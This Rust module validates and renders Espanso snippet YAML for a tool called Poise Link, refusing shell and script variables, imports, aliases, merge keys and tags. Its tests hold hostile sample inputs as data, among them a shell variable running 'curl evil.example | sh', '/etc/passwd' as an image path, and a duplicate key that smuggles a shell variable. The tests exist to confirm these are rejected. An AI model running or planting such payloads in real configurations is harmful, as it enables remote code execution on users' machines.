//! The snippets document: strict validation of what the workspace sends, and
//! the file Poise Link writes for Espanso.
//!
//! Espanso executes some match features (shell and script variables, forms,
//! imports of other files), so nothing but plain `trigger`/`replace` string
//! pairs, with an optional `label`, may reach its folder. The workspace's YAML
//! is never written as received: it is parsed strictly here and Poise Link
//! writes its own rendering, so YAML that two parsers could read differently
//! (duplicate keys, aliases, merge keys, tags, several documents) has no way
//! through.

use std::fmt::{self, Write as _};

use serde::Deserialize;
use serde::de::{self, Deserializer, SeqAccess, Visitor};
use serde_saphyr::{DuplicateKeyPolicy, MergeKeyPolicy};

/// The first line of every `poise.yml` Poise Link writes.
pub const HEADER: &str =
    "# Managed by Poise Link. Edit snippets in Poise; changes made here are overwritten.";

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Snippet {
    pub trigger: Text,
    pub replace: Text,
    #[serde(default)]
    pub label: Option<Text>,
}

/// A YAML string and nothing else: numbers, booleans, null, lists, maps and
/// tagged values are refused rather than converted.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Text(pub String);

impl<'de> Deserialize<'de> for Text {
    fn deserialize<D: Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct StringOnly;

        impl Visitor<'_> for StringOnly {
            type Value = Text;

            fn expecting(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
                formatter.write_str("a string")
            }

            fn visit_str<E: de::Error>(self, value: &str) -> Result<Text, E> {
                Ok(Text(value.to_owned()))
            }

            fn visit_string<E: de::Error>(self, value: String) -> Result<Text, E> {
                Ok(Text(value))
            }
        }

        deserializer.deserialize_any(StringOnly)
    }
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct Document {
    matches: Matches,
}

/// A YAML list and nothing else. A null would otherwise read as an empty
/// list, and a broken response would wipe every snippet on the desktop.
struct Matches(Vec<Snippet>);

impl<'de> Deserialize<'de> for Matches {
    fn deserialize<D: Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct ListOnly;

        impl<'de> Visitor<'de> for ListOnly {
            type Value = Matches;

            fn expecting(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
                formatter.write_str("a list of snippets")
            }

            fn visit_seq<A: SeqAccess<'de>>(self, mut seq: A) -> Result<Matches, A::Error> {
                let mut snippets = Vec::new();
                while let Some(snippet) = seq.next_element::<Snippet>()? {
                    snippets.push(snippet);
                }
                Ok(Matches(snippets))
            }
        }

        deserializer.deserialize_any(ListOnly)
    }
}

/// Parses the workspace's snippets YAML, accepting only a mapping whose single
/// key `matches` lists plain snippets. Any other content rejects the whole
/// document.
pub fn parse(yaml: &str) -> Result<Vec<Snippet>, String> {
    let options = serde_saphyr::options! {
        budget: serde_saphyr::budget! {
            max_documents: 1,
            max_aliases: 0,
            max_merge_keys: 0,
        },
        duplicate_keys: DuplicateKeyPolicy::Error,
        merge_keys: MergeKeyPolicy::Error,
        strict_booleans: true,
        reject_unsupported_tags: true,
        with_snippet: false,
    };
    serde_saphyr::from_str_with_options::<Document>(yaml, options)
        .map(|document| document.matches.0)
        .map_err(|error| error.to_string())
}

/// Renders `snippets` as Espanso match YAML. Every value is written as a
/// double-quoted scalar, which every YAML parser reads as a plain string.
pub fn render(snippets: &[Snippet]) -> String {
    let mut out = String::new();
    out.push_str(HEADER);
    out.push('\n');
    if snippets.is_empty() {
        out.push_str("matches: []\n");
        return out;
    }
    out.push_str("matches:\n");
    for snippet in snippets {
        out.push_str("  - trigger: ");
        quote(&mut out, &snippet.trigger.0);
        out.push_str("\n    replace: ");
        quote(&mut out, &snippet.replace.0);
        out.push('\n');
        if let Some(label) = &snippet.label {
            out.push_str("    label: ");
            quote(&mut out, &label.0);
            out.push('\n');
        }
    }
    out
}

/// Whether `contents` is a file Poise Link wrote (or one claiming to be).
pub fn is_managed(contents: &str) -> bool {
    contents.lines().next() == Some(HEADER)
}

fn quote(out: &mut String, value: &str) {
    out.push('"');
    for c in value.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            // Other control characters, and the characters YAML 1.1 parsers treat as line breaks.
            c if c.is_control() || matches!(c, '\u{2028}' | '\u{2029}' | '\u{feff}') => {
                write!(out, "\\u{:04X}", u32::from(c)).expect("writing to a String cannot fail");
            }
            c => out.push(c),
        }
    }
    out.push('"');
}

#[cfg(test)]
mod tests {
    use super::*;

    fn snippet(trigger: &str, replace: &str, label: Option<&str>) -> Snippet {
        Snippet {
            trigger: Text(trigger.into()),
            replace: Text(replace.into()),
            label: label.map(|l| Text(l.into())),
        }
    }

    fn rejected(yaml: &str) -> String {
        match parse(yaml) {
            Ok(snippets) => panic!("accepted {yaml:?} as {snippets:?}"),
            Err(reason) => reason,
        }
    }

    #[test]
    fn accepts_plain_pairs_as_the_workspace_writes_them() {
        let yaml = format!(
            "{HEADER}\nmatches:\n  - trigger: \";sig\"\n    replace: |-\n      Best,\n      Mikko\n  - trigger: ;hi\n    replace: hello\n    label: Greeting\n"
        );
        assert_eq!(
            parse(&yaml).unwrap(),
            vec![
                snippet(";sig", "Best,\nMikko", None),
                snippet(";hi", "hello", Some("Greeting")),
            ]
        );
    }

    #[test]
    fn accepts_an_empty_list_and_quoted_look_alikes() {
        assert_eq!(parse("matches: []").unwrap(), vec![]);
        let yaml = "matches:\n  - trigger: \"123\"\n    replace: \"true\"\n  - trigger: ';yes'\n    replace: yes\n";
        assert_eq!(
            parse(yaml).unwrap(),
            vec![snippet("123", "true", None), snippet(";yes", "yes", None)]
        );
    }

    #[test]
    fn rejects_every_espanso_feature_beyond_plain_pairs() {
        let base = "matches:\n  - trigger: \";x\"\n    replace: \"{{out}}\"\n";
        assert_eq!(parse(base).unwrap(), vec![snippet(";x", "{{out}}", None)]);
        for (key, entry) in [
            (
                "vars",
                "vars:\n      - name: out\n        type: shell\n        params:\n          cmd: \"curl evil.example | sh\"",
            ),
            (
                "vars",
                "vars:\n      - name: out\n        type: script\n        params:\n          args: [python, -c, 'import os']",
            ),
            ("form", "form: \"Hello [[name]]\""),
            (
                "form_fields",
                "form_fields:\n      name:\n        type: text",
            ),
            ("regex", "regex: \"(?P<x>.*)\""),
            ("triggers", "triggers: [\";a\", \";b\"]"),
            ("image_path", "image_path: /etc/passwd"),
            ("html", "html: \"<b>x</b>\""),
            ("markdown", "markdown: \"*x*\""),
            ("force_clipboard", "force_clipboard: true"),
            ("word", "word: true"),
            ("propagate_case", "propagate_case: true"),
            ("search_terms", "search_terms: [a]"),
        ] {
            let reason = rejected(&format!("{base}    {entry}\n"));
            assert!(
                reason.contains(&format!("unknown field `{key}`")),
                "{key}: {reason}"
            );
        }
    }

    #[test]
    fn rejects_top_level_keys_other_than_matches() {
        rejected(
            "matches: []\nglobal_vars:\n  - name: x\n    type: shell\n    params: {cmd: id}\n",
        );
        rejected("matches: []\nimports:\n  - /tmp/evil.yml\n");
        rejected("matches: []\nanchors: {}\n");
        rejected("{}");
        rejected("");
    }

    #[test]
    fn rejects_values_that_are_not_strings() {
        rejected("matches:\n  - trigger: 123\n    replace: x\n");
        rejected("matches:\n  - trigger: \";x\"\n    replace: true\n");
        rejected("matches:\n  - trigger: \";x\"\n    replace: ~\n");
        rejected("matches:\n  - trigger: \";x\"\n    replace:\n");
        rejected("matches:\n  - trigger: \";x\"\n    replace: [a, b]\n");
        rejected("matches:\n  - trigger: \";x\"\n    replace: {a: b}\n");
        rejected("matches:\n  - trigger: \";x\"\n    replace: x\n    label: 5\n");
        rejected("matches:\n  - trigger: \";x\"\n");
        rejected("matches:\n  - replace: \"x\"\n");
    }

    #[test]
    fn rejects_documents_of_the_wrong_shape() {
        rejected("- trigger: \";x\"\n  replace: x\n");
        rejected("matches: \";x\"\n");
        rejected("matches:\n  - \";x\"\n");
        rejected("matches: ~\n");
        rejected("matches:\n");
        rejected("matches:\n  - ~\n");
    }

    #[test]
    fn rejects_yaml_that_parsers_could_read_differently() {
        for (yaml, why) in [
            // A second `matches` (some parsers keep the last one) smuggling a shell variable.
            (
                "matches:\n  - trigger: \";a\"\n    replace: a\nmatches:\n  - trigger: \";b\"\n    replace: \"{{o}}\"\n    vars: [{name: o, type: shell, params: {cmd: id}}]\n",
                "duplicate mapping key: matches",
            ),
            (
                "matches:\n  - trigger: \";a\"\n    replace: a\n    replace: b\n",
                "duplicate mapping key: replace",
            ),
            (
                "matches:\n  - &e {trigger: \";a\", replace: a}\n  - *e\n",
                "Aliases",
            ),
            (
                "matches:\n  - <<: {vars: [{name: o, type: shell, params: {cmd: id}}]}\n    trigger: \";a\"\n    replace: a\n",
                "merge",
            ),
            (
                "matches:\n  - trigger: \";a\"\n    replace: !shell id\n",
                "unsupported tag `!shell`",
            ),
            (
                "matches: []\n---\nmatches:\n  - trigger: \";a\"\n    replace: a\n    vars: []\n",
                "Documents",
            ),
        ] {
            let reason = rejected(yaml);
            assert!(reason.contains(why), "expected {why:?}, got {reason:?}");
        }
    }

    #[test]
    fn renders_with_the_header_and_round_trips_tricky_text() {
        let tricky = vec![
            snippet(";q", "He said \"hi\" \\ bye", Some("quotes")),
            snippet(";nl", "line 1\nline 2\r\n\ttabbed", None),
            snippet(
                ";yaml",
                "*alias &anchor !tag #comment key: value - [x] {y} | > % @ `",
                None,
            ),
            snippet(";var", "Dear {{name}},", None),
            snippet(
                ";ctl",
                "bell\u{7} esc\u{1b} nel\u{85} ls\u{2028} bom\u{feff}",
                None,
            ),
            snippet("123", "true", Some("null")),
            snippet(";uni", "héllo 👋 日本", None),
            snippet(" padded ", "", None),
        ];
        let rendered = render(&tricky);
        assert!(rendered.starts_with(&format!("{HEADER}\nmatches:\n")));
        assert!(is_managed(&rendered));
        assert_eq!(parse(&rendered).unwrap(), tricky);
    }

    #[test]
    fn renders_an_empty_list() {
        let rendered = render(&[]);
        assert_eq!(rendered, format!("{HEADER}\nmatches: []\n"));
        assert_eq!(parse(&rendered).unwrap(), vec![]);
    }

    #[test]
    fn recognizes_files_it_did_not_write() {
        assert!(!is_managed(
            "matches:\n  - trigger: \";a\"\n    replace: a\n"
        ));
        assert!(!is_managed(""));
        assert!(!is_managed(&format!("# my notes\n{HEADER}\n")));
    }
}
